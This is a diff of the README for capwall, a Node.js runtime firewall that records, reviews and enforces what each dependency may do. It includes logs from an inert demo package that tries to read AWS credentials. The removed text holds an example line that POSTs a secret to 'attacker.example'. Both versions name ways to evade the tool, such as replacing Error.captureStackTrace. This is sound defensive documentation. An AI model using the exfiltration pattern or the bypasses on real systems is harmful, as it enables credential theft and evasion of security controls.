@@ -1,265 +1,251 @@
 # capwall
 
-**A runtime, per-package capability firewall for Node.js.** Defense-in-depth against
-supply-chain malware — declare what each dependency is *allowed to do* (files, network,
-subprocesses, env, …), then enforce it at runtime.
-
-> Status: **the roadmap is complete — M1–M5 and stretch S1–S4 are all implemented**
-> ([`docs/roadmap.md`](./docs/roadmap.md) has the milestone table, which is the one place
-> status is tracked). The observe → policy → enforce loop runs end-to-end on **both the CJS
-> `require` and the ESM `import` paths**, for `fs`, the egress modules
-> (`net`/`http`/`https`/`tls`/`http2`/`dgram`), `child_process`, `worker_threads`,
-> `process.env`, `vm`, `.node` addon loads, `Module.prototype._compile`, and the **global**
-> egress APIs `fetch`/`WebSocket`/`EventSource`.
->
-> **Nothing is published to npm yet** — the manifests are staged at `0.1.0` but nothing has
-> been uploaded, so run it from a clone (see [Quickstart](#quickstart-the-observe--enforce-loop)). And read
-> [`docs/threat-model.md`](./docs/threat-model.md) before relying on it: "implemented" is a
-> statement about coverage, not about strength, and capwall is deliberately not a sandbox.
+**A runtime, per-package capability firewall for Node.js.** Record what each dependency
+actually does, review it, then enforce it — so a compromised package cannot quietly start
+reading your credentials.
 
 ---
 
-## Why capwall exists
+## The problem
 
-Modern supply-chain malware does not stop at install time. Worms like **Shai-Hulud**
-(Nov 2025) and **Glassworm** (2026) run malicious code at **both** the lifecycle-script
-phase *and* the application-runtime phase. Install-time gates (lockfile pinning,
-`--ignore-scripts`, socket/scanner tooling) never see the runtime phase, where the
-interesting damage — credential exfiltration, wallet theft, lateral movement — actually
-happens.
+Your date-formatting library can read `~/.aws/credentials` and POST it to an attacker's
+server. So can your colour-string helper, your CLI-spinner package, and every transitive
+dependency you have never heard of that came in behind them. Node gives every package in
+`node_modules` the same authority your application has: the whole filesystem, every socket,
+every environment variable, arbitrary subprocesses. There is no notion of *"this package was
+only ever supposed to parse dates."*
 
-capwall closes that gap. It sits inside the running process and mediates the
-capability-sensitive surface (`fs`; `net`/`http`/`https`/`tls`/`http2`/`dgram`; the global
-`fetch`/`WebSocket`/`EventSource`; `child_process`; `worker_threads`; `process.env`; `vm`;
-`.node` addon loads; and `Module.prototype._compile`) **per owning
-package**. A logging library that suddenly opens a
-socket to an unknown host, or a color-string helper that reads `process.env`, is a policy
-violation — logged in `observe` mode, denied in `enforce` mode.
+That is not hypothetical any more. Worms like **Shai-Hulud** (Nov 2025) and **Glassworm**
+(2026) run their payload at **application runtime**, not just in an install script — which is
+the phase lockfile pinning, `--ignore-scripts` and registry scanners never see. By the time
+the payload runs, the interesting damage (credential exfiltration, wallet theft, lateral
+movement) is a plain `fs.readFileSync` and a plain `fetch`.
 
-### The GO rationale
+capwall sits inside the running process, attributes every capability-sensitive call to the
+**package that made it**, and checks it against that package's policy. A logging library that
+suddenly opens a socket, or a string helper that reads `process.env`, is a policy violation —
+logged in `observe` mode, denied in `enforce` mode.
 
-The idea is proven. The KTH-LangSec **NodeShield** research prototype (CCS 2025,
-["Runtime Enforcement of Security-Enhanced SBOMs for Node.js"](https://doi.org/10.1145/3719027.3765136),
-Cornelissen & Balliu) demonstrated per-package capability enforcement via
-module-load/resource interception that is **non-SES, out-of-band, "vanilla Node
-compatible", and <1ms/req**. But NodeShield is a dead single-commit prototype with no DX.
+## The loop
 
-capwall takes that core mechanism and makes it *usable*:
-
-- **No SES tax.** [LavaMoat](https://github.com/LavaMoat/LavaMoat) (MetaMask) is the mature
-  OSS analog, but it is SES-based: hardened primordials break some packages, ESM and
-  native-addon coverage is uneven, and it shines in the browser-bundler path. capwall
-  intercepts at the module-load (`require`/`import`) and syscall-surface boundary instead
-  of hardening every primordial — trading some isolation strength for near-zero adoption
-  friction.
-- **Per-package granularity.** Node's built-in [`--permission`](https://nodejs.org/api/permissions.html)
-  model is **process-global**, not per-package. capwall's whole point is that *express*
-  and *some-transitive-dep-you've-never-heard-of* get different capability sets in the same
-  process.
-- **Trace-to-policy DX (the headline feature).** Run your app or test suite once in
-  `observe` mode → capwall auto-emits a starter per-package `capabilities.json` → you review
-  and tighten it → flip to `enforce`. This trace→policy loop is underdeveloped everywhere
-  and is capwall's reason to exist.
-
----
-
-## Landscape
-
-| Tool | Boundary / mechanism | Granularity | Runtime enforcement | SES / primordial tax | Primary turf |
-|---|---|---|---|---|---|
-| **capwall** | module-load + core-API shims (non-SES, out-of-band) | **per-package** | **yes** (observe → enforce) | **no** | runtime confinement of deps in Node services |
-| **LavaMoat** | SES compartments, hardened primordials | per-package | yes | **yes** | browser/bundler builds, MetaMask |
-| **Node `--permission`** | process-level flag (fs/net/child_process/worker) | **process-global** | yes | no | coarse whole-process lockdown |
-| **Socket Firewall / socket.dev** | install-time + registry signals, network broker | per-package (install) | mostly install-time | no | blocking known-bad installs/publishes |
-| **guarddog (Datadog)** | static/heuristic package scanner | per-package (scan) | **no** | no | CI detection of malicious packages |
-
-capwall is complementary to the scanners: they try to *detect* a bad package before it
-lands; capwall assumes one got through and *contains what it can do at runtime*.
-
----
-
-## MVP scope (build order)
-
-1. **Module-load interception** — patch CJS `require`/loader; ESM via synchronous
-   `module.registerHooks()` loader hooks. Attribute every capability-sensitive call to the **owning package** via
-   call-stack / module path.
-2. **Declarative per-package capability policy** — `capabilities.json` mapping each package
-   to allowed `fs` (read/write path globs), `net` (host patterns/ports), `ipc` (unix-socket /
-   named-pipe path globs), `child_process`, `worker_threads`, `env` (key allowlist), `vm`,
-   `native` (may it load a `.node` addon — a load-time gate, never confinement), `compile`
-   (may it compile code under another package's filename — identity-granting, see the policy
-   docs). Compact, a handful of entries per dep. A key names an *install position*: `lodash`
-   is the top-level install, `webpack>lodash` the copy nested under `webpack`.
-3. **Two modes: `observe` and `enforce`** — observe logs violations without blocking (the
-   on-ramp); enforce denies-by-default and throws.
-4. **Auto-policy generation from a trace run** — `capwall observe` runs the target's
-   entrypoint/test suite, records observed capabilities, and emits a starter
-   `capabilities.json`. **Headline feature.**
-5. **Capability shims for the core surface** — `node:fs`; the egress modules `node:net`,
-   `node:http`, `node:https`, `node:tls`, `node:http2`, `node:dgram` (each shimmed
-   separately — one does not cover another, see
-   [`docs/architecture.md`](./docs/architecture.md) § Capability shims);
-   `node:child_process`, `node:worker_threads`, `process.env`, `node:vm`; plus Node's
-   **global** egress APIs (`fetch`, `WebSocket`, `EventSource`), which are not module exports
-   and so are guarded on `globalThis` against the same `net` grant.
-
-**Stretch (post-MVP):** SBOM/CBOM import (CycloneDX → policy, NodeShield-compatible) in
-`packages/sbom-import`; native-addon (`.node`) load attribution and gating; a CI
-observed-vs-declared diff report (`capwall diff`); full ESM parity.
-
-All five MVP steps and all four stretch items are implemented —
-[`docs/roadmap.md`](./docs/roadmap.md)'s milestone table is the single place status is
-tracked, and this list is a description of scope, not of progress.
-
----
-
-## Quickstart (the observe → enforce loop)
-
-> **capwall is not published to npm yet.** `@capwall/cli` and `@capwall/core` are not on the
-> registry — the manifests are staged at `0.1.0` but nothing has been uploaded — so
-> `pnpm add -D @capwall/cli` will
-> 404 today. Step 1 below builds it from a clone instead; every later step is exactly what
-> you would run against a published build. The whole loop — all capabilities, CJS and ESM —
-> works from a clone right now.
-
-### Prerequisites
-
-| | |
-|---|---|
-| **Node** | ≥ 22.15 (tested on 22, 24 and 26) |
-| **pnpm** | ≥ 11 — **required, not a preference** |
-
-capwall is a pnpm workspace, and the root manifest has no npm `workspaces` field. `npm install`
-at the clone root therefore *succeeds* while linking none of the four packages, and the build
-then fails with `Cannot find module 'zod'` — which reads as "this project is broken" rather than
-"wrong package manager". A root `preinstall` guard now stops that with an explanation, but the
-easy path is to let Corepack hand you the pnpm version the repo already pins
-(`packageManager: "pnpm@11.17.0"`):
+You do not write the policy. You **record** it, read it, and commit it.
 
 ```bash
-corepack enable   # provides the pnpm version this repo pins
+# 1. OBSERVE — run your app or test suite. Nothing is blocked. capwall records what
+#    every package actually did and writes a starter policy.
+capwall observe -- node ./src/server.js
+#   → [capwall] observed 6 capability event(s) across 4 package(s); wrote capabilities.json
+#   → [capwall] review/tighten it, then run: capwall enforce -- node ./src/server.js
+
+# 2. REVIEW — open capabilities.json. It is short, and it is the point (see below).
+#    Delete anything a dependency has no business doing.
+
+# 3. COMMIT it. It is now a reviewed artifact in your repo, like a lockfile.
+
+# 4. ENFORCE — anything not in the policy is denied by default and throws.
+capwall enforce -- node ./src/server.js
+
+# 5. KEEP IT HONEST IN CI — re-observe and fail the build if a dependency started
+#    using a capability it never used before. Exit 0 = no drift, 1 = drift.
+capwall diff -- node ./src/server.js
 ```
 
-`pnpm install` runs **no dependency install scripts** on a fresh clone. That is deliberate, and
-since the vite 8 bump it is also literal: no package anywhere in the tree declares one. pnpm
-blocks install scripts by default, and `pnpm-workspace.yaml`'s `allowBuilds` map — where a
-reviewed script *would* be recorded, as `name: true` or `name: false` — is a key that deliberately
-does not exist today; the file's own header says why an empty `allowBuilds: {}` is worse than no
-key at all. Nothing needs approving.
+### The artifact
 
-If a fresh install ever *fails* with `ERR_PNPM_IGNORED_BUILDS`, a new dependency brought a new
-install script in and pnpm wants a decision on it. Note that word: pnpm 11 **fails the install**
-where pnpm 10 printed a warning, so it cannot be scrolled past. Read `pnpm-workspace.yaml`'s
-header before writing an entry, because `true` there is a security decision rather than a build
-fix.
+This is a real `capabilities.json`, emitted by step 1 against
+[`examples/express-app`](./examples/express-app) — an Express 5 server that appends to a log
+file and reads a little environment (line-wrapped here for width):
+
+```json
+{
+  "version": 1,
+  "mode": "observe",
+  "default": {},
+  "packages": {
+    "<app>": {
+      "fs": { "read": [], "write": ["./logs", "./logs/requests.log"] }
+    },
+    "debug": { "env": ["DEBUG"] },
+    "depd": { "env": ["NO_DEPRECATION", "TRACE_DEPRECATION"] },
+    "express": { "env": ["NODE_ENV"] }
+  }
+}
+```
+
+Four entries. That is the whole authority the process needs, written down where a human can
+read it in ten seconds — and a diff will show you the day it changes. Every omitted field is a
+denial: `express` may read one environment variable and *nothing else* — no files, no sockets,
+no subprocesses. `<app>` is your own code, the trust root; a key like `webpack>lodash` names
+the copy of `lodash` installed under `webpack`, which is a different principal from the
+top-level `lodash` ([`docs/policy-format.md`](./docs/policy-format.md) § Package keys).
+
+Then you set `"mode": "enforce"` and commit. `capwall run` takes the mode from the file, so
+promoting a project from observe to enforce is a one-word diff in a reviewed artifact rather
+than a change to how CI invokes the tool.
+
+### What enforcement looks like
+
+[`examples/malicious-dep-demo`](./examples/malicious-dep-demo) vendors an inert fixture
+dependency that behaves like a Shai-Hulud-class payload — it reads
+`process.env.AWS_SECRET_ACCESS_KEY` and a credentials file. Under a policy that grants it
+nothing:
+
+```
+$ capwall enforce -- node src/index.js
+[capwall] enforce: DENY 'sneaky-dep' env:AWS_SECRET_ACCESS_KEY (not in policy; deny-by-default)
+[sneaky-dep] read process.env.AWS_SECRET_ACCESS_KEY => undefined (INERT)
+[capwall] enforce: DENY 'sneaky-dep' fs:read .../sneaky-dep/fake-secret.txt (not in policy; deny-by-default)
+[demo] BLOCKED by capwall: enforce: DENY 'sneaky-dep' fs:read ... (not in policy; deny-by-default)
+$ echo $?
+1
+```
+
+(Paths abbreviated; capwall prints them absolute.)
+
+The env read is **soft-denied** — capwall returns `undefined`, so the value is never revealed,
+without crashing the caller. The file read is **hard-denied**: it throws before any bytes are
+read. Both are logged.
+
+And in CI, `capwall diff` names the drift and exits non-zero:
+
+```
+[capwall] diff: DRIFT — 2 observed capability event(s) not granted by capabilities.json
+  sneaky-dep  env AWS_SECRET_ACCESS_KEY (not granted)
+  sneaky-dep  fs:read .../sneaky-dep/fake-secret.txt (not granted)
+```
+
+---
+
+## Install
+
+> **Nothing is published to npm yet.** Neither `@capwall/cli` nor `@capwall/core` exists on the
+> registry — the manifests are staged at `0.1.0` but nothing has been uploaded, so
+> `pnpm add -D @capwall/cli` will 404 today. Build it from a clone; every command shown above
+> is exactly what you would run against a published build, and the whole loop works from a
+> clone right now.
+
+Requirements: **Node ≥ 22.15** (tested on 22, 24 and 26) and **pnpm ≥ 11** — required, not a
+preference. capwall is a pnpm workspace with no npm `workspaces` field, so `npm install` at the
+clone root would succeed while linking none of the four packages; a root `preinstall` guard
+refuses it with an explanation.
+
 ```bash
-# 1. Build capwall from a clone (there is no published package yet — see the note above).
+corepack enable                                # provides the pnpm this repo pins
 git clone https://github.com/williamzujkowski/capwall.git ~/src/capwall
 cd ~/src/capwall && pnpm install && pnpm build
 
-#    The CLI is then ~/src/capwall/packages/cli/dist/index.js. Run it by path, or alias it:
+# The CLI is then ~/src/capwall/packages/cli/dist/index.js. Run it by path, or alias it:
 alias capwall='node ~/src/capwall/packages/cli/dist/index.js'
-#    Then cd back to YOUR project — capwall uses its working directory as the project root.
-
-# 2. OBSERVE: run your app or test suite; capwall records what each package actually does
-#    and writes a starter policy. Nothing is blocked in this mode.
-capwall observe -- node ./src/server.js
-#   → [capwall] observed 41 capability event(s) across 12 package(s); wrote capabilities.json
-#   → [capwall] review/tighten it, then run: capwall enforce -- node ./src/server.js
-
-# 3. Review & tighten capabilities.json by hand. Remove anything a dep shouldn't need.
-
-# 4. ENFORCE: run for real. Anything not in the policy is denied by default and throws.
-capwall enforce -- node ./src/server.js
-
-# Or let the committed policy decide: `capwall run` uses its "mode" field, so promoting a
-# project from observe to enforce is a one-word diff in a reviewed file.
-capwall run -- node ./src/server.js
-
-# 5. KEEP IT HONEST IN CI: `capwall diff` re-observes and reports anything the committed
-#    policy would deny — a dependency that started using a capability it never used before.
-#    Exit 0 = no drift, 1 = drift, 2 = usage error. `--json` for machine-readable output.
-capwall diff -- node ./src/server.js
-
-# Explain why a given call was allowed/denied:
-capwall explain pino fs:write ./logs/app.log
-
-# Which build is this? (the CLI's version, and the @capwall/core it injects into the target —
-# they are two different processes, so they are two different questions.)
-capwall --version
 ```
 
-See [`examples/express-app`](./examples/express-app) for a full observe→enforce walkthrough
-and [`examples/malicious-dep-demo`](./examples/malicious-dep-demo) for a fixture dependency
-that capwall blocks in `enforce` mode.
+Then `cd` back to **your** project — capwall treats its own working directory as the project
+root. Full command reference, flags and exit codes: [`docs/cli.md`](./docs/cli.md).
 
 ---
 
-## Honest scope note (read this)
+## Honest scope — read this before you rely on it
 
-capwall is **pragmatic defense-in-depth, not a formal sandbox.** Without SES's frozen
-primordials, a *determined in-process attacker* (prototype pollution, shared mutable
-primordials, fd/symlink escapes, un-patching the shims, `node:sqlite`/`vm`/`eval`, native
-`.node` addons, spawned-subprocess internals) can defeat it. The sharpest form of that, worth
-knowing before you rely on any of it: capwall decides **who is calling** by asking V8 for the
-stack, so replacing `Error.captureStackTrace` — one line, self-restoring, and **not** mitigated
-by hardened mode — lets a caller mint any principal in the policy. Every gate is a decision
-about a principal, so that assumption bounds all of them; see
-[`docs/threat-model.md`](./docs/threat-model.md) § The one assumption every control rests on.
-capwall's job is to stop **opportunistic, worm-style supply-chain malware** — the Shai-Hulud /
-Glassworm class that runs at application-runtime and does not go out of its way to break out of
-a capability shim.
+capwall is **pragmatic defense-in-depth, not a formal sandbox.** Overclaiming here would be a
+security bug, so:
 
-Native addons and subprocesses can be **gated** (whether they run) but not **confined**
-(what they do once running). A `"native": true` grant in particular is a load-time decision
+**A determined in-process attacker can defeat it.** Without SES's frozen primordials,
+prototype pollution, fd/symlink escapes, un-patching the shims, `node:sqlite`/`vm`/`eval`,
+native `.node` addons and spawned-subprocess internals are all available. The sharpest form:
+capwall decides **who is calling** by asking V8 for the stack, so replacing
+`Error.captureStackTrace` — one line, self-restoring, and **not** mitigated by hardened mode —
+lets a caller mint any principal in the policy. Every gate is a decision about a principal, so
+that one assumption bounds all of them. capwall's job is to stop **opportunistic, worm-style
+supply-chain malware** that runs at application runtime and does not go out of its way to break
+out of a capability shim.
+
+**Gated is not confined.** Native addons and subprocesses can be gated (*whether* they run) but
+not confined (*what they do* once running). A `"native": true` grant is a load-time decision
 with no confinement whatsoever — compiled code in the process reaches files, sockets and the
-environment without touching a shimmed JS builtin, so read it as trusting that package
-completely.
+environment without touching a shimmed JS builtin. Read it as trusting that package completely.
 
 **Package identity is a position in the dependency tree, not a verified fact.** A principal is
-the path a frame's file sits at — `lodash` for the top-level install, `webpack>lodash` for the
-copy nested under `webpack`. That keeps one package from *impersonating another's position*
-(issue #92), but capwall does not verify what is installed at a position: a typosquat, a
-compromised publish, or anything that can write into `node_modules` still answers to that name.
-The `compile` and `vm` grants are identity-granting in the same spirit — a package holding
-either can execute as any principal in the policy. See
-[`docs/threat-model.md`](./docs/threat-model.md) § Package identity.
+where a frame's file sits: `lodash` for the top-level install, `webpack>lodash` for the copy
+nested under `webpack`. That stops one package impersonating another's *position*, but capwall
+does not verify what is installed at a position — a typosquat, a compromised publish, or
+anything that can write into `node_modules` still answers to that name. The `compile` and `vm`
+grants are identity-granting in the same spirit: a package holding either can execute as any
+principal in the policy.
 
-**Global egress is covered, with named residuals.** `globalThis.fetch`, `globalThis.WebSocket`
-and `globalThis.EventSource` never route through a module load, so no shim can see them; they
-are instead replaced on `globalThis` and checked against the same `net` grant as
-`http.request` (issue #80). A dependency calling
-`fetch("https://attacker.example/", { method: "POST", body: secret })` under a policy that does
-not grant that host is denied and logged, exactly like the module surfaces. Four things that
-guard does *not* do, because they are the honest edge of it: a **redirect hop is guarded only
-after the request has gone out** (undici follows it internally — capwall guards the final origin,
-so the hop is recorded and the response is cancelled in `enforce`, but the body has already
-left); `init.dispatcher` lets a caller supply the code that opens the socket, re-gated only if
-*that* code dials through a mediated module; a dependency that captured `fetch` before capwall
-installed holds the raw function; and the replaced global stays writable unless hardened mode is
-on — and even then `Object.defineProperty(globalThis, "fetch", …)` is open, which is the
-unavoidable price of a global `uninstall()` can put back. See
-[`docs/threat-model.md`](./docs/threat-model.md) § Global egress surfaces.
+**Global egress is covered, with named residuals.** `globalThis.fetch`, `WebSocket` and
+`EventSource` never route through a module load, so they are replaced on `globalThis` and
+checked against the same `net` grant as `http.request`. Four things that guard does not do: a
+redirect hop is guarded only *after* the request has gone out (undici follows it internally);
+`init.dispatcher` lets a caller supply the code that opens the socket; a dependency that
+captured `fetch` before capwall installed holds the raw function; and the replaced global stays
+writable unless hardened mode is on — and even then `Object.defineProperty(globalThis, "fetch",
+…)` is open, the unavoidable price of a global `uninstall()` can put back.
 
-Full details, and the comparison to the SES and Node-permission threat models, are in
-[`docs/threat-model.md`](./docs/threat-model.md) — read it before relying on capwall for
-anything.
+The full accounting — every residual, and the comparison to the SES and Node-permission threat
+models — is [`docs/threat-model.md`](./docs/threat-model.md). Read it before relying on capwall
+for anything.
 
 ---
 
-## Repository layout
+## What capwall mediates
 
-```
-packages/core            @capwall/core          interception engine + policy evaluator
-packages/cli             @capwall/cli           capwall observe|enforce|run|diff|gen-policy|explain
-packages/policy-schema   @capwall/policy-schema  capabilities.json schema + TS types + schema.json
-packages/sbom-import     @capwall/sbom-import    STRETCH: CycloneDX/CBOM → policy
-examples/express-app                             observe→enforce walkthrough fixture
-examples/malicious-dep-demo                      inert "malicious" dep capwall blocks
-docs/                                            threat-model, architecture, policy-format,
-                                                 node-api-dependencies, roadmap, ci-local,
-                                                 releasing
-```
+Nine capability kinds, per package, on both the CJS `require` and the ESM `import` paths:
+**`fs`** (including a `require`/`import` of a file outside every `node_modules` tree), **`net`**
+(`net`/`http`/`https`/`tls`/`http2`/`dgram` *and* global `fetch`/`WebSocket`/`EventSource`),
+**`ipc`** (unix sockets and named pipes), **`env`** (`process.env` reads), **`child_process`**,
+**`worker_threads`**, **`vm`**, **`native`** (`.node` addon loads) and **`compile`**. On Node ≥26
+behind `--localstorage-file`, `localStorage` takes an `fs` decision on its backing file — no new
+capability kind, because the API a package used to reach a file is not a separate authority.
+Field-by-field: [`docs/policy-format.md`](./docs/policy-format.md).
+
+Each of the six egress modules is shimmed **separately**; one never covers another, and that is
+a security property rather than a style choice ([`docs/architecture.md`](./docs/architecture.md)
+§ Capability shims).
+
+## How it compares
+
+| Tool | Boundary / mechanism | Granularity | Runtime enforcement | SES / primordial tax |
+|---|---|---|---|---|
+| **capwall** | module-load + core-API shims (non-SES, out-of-band) | **per-package** | **yes** (observe → enforce) | **no** |
+| **LavaMoat** | SES compartments, hardened primordials | per-package | yes | **yes** |
+| **Node `--permission`** | process-level flag | **process-global** | yes | no |
+| **Socket Firewall / socket.dev** | install-time + registry signals | per-package (install) | mostly install-time | no |
+| **guarddog (Datadog)** | static/heuristic package scanner | per-package (scan) | **no** | no |
+
+The scanners *detect* a bad package before it lands; capwall assumes one got through. Against
+Node's [`--permission`](https://nodejs.org/api/permissions.html) the difference is granularity:
+*express* and *some-transitive-dep-you've-never-heard-of* get different capability sets in the
+same process. Against LavaMoat it is adoption cost — capwall intercepts at the module-load and
+core-API boundary instead of hardening every primordial, trading isolation strength for
+near-zero friction.
+
+The mechanism is not novel; the ergonomics are. KTH-LangSec's **NodeShield** prototype (CCS
+2025, ["Runtime Enforcement of Security-Enhanced SBOMs for
+Node.js"](https://doi.org/10.1145/3719027.3765136)) demonstrated per-package enforcement that is
+non-SES, out-of-band and "vanilla Node compatible" — but it is a dead single-commit prototype
+with no DX. The observe→review→enforce loop is what capwall adds.
+
+---
+
+## Documentation
+
+| | |
+|---|---|
+| [`docs/cli.md`](./docs/cli.md) | every command, flag and exit code |
+| [`docs/policy-format.md`](./docs/policy-format.md) | `capabilities.json` field by field; package keys; mode precedence |
+| [`docs/threat-model.md`](./docs/threat-model.md) | what the mediation is and is not worth — every residual, named |
+| [`docs/architecture.md`](./docs/architecture.md) | interception, attribution, the patch lifecycle |
+| [`docs/node-api-dependencies.md`](./docs/node-api-dependencies.md) | the unsupported Node internals capwall rests on, measured per major |
+| [`docs/ci-local.md`](./docs/ci-local.md) | reproducing the CI matrix locally; drift detection in CI |
+| [`docs/roadmap.md`](./docs/roadmap.md) | build order, and the one place milestone status is tracked |
+| [`docs/releasing.md`](./docs/releasing.md) | the publish runbook, and what is (and is not) in the release |
+| [`packages/core/README.md`](./packages/core/README.md) | the `install()` API, hardened mode, and the complete `CAPWALL_*` table |
+| [`scripts/bench/README.md`](./scripts/bench/README.md) | the performance numbers, and where the per-call budget does not hold |
+
+Four packages: `@capwall/core` (interception engine + policy evaluator), `@capwall/cli` (the
+`capwall` command), `@capwall/policy-schema` (the schema, TS types and `schema.json`) and
+`@capwall/sbom-import` (CycloneDX/CBOM → starter policy). Two runnable fixtures:
+[`examples/express-app`](./examples/express-app) and
+[`examples/malicious-dep-demo`](./examples/malicious-dep-demo).
 
 ## License
 
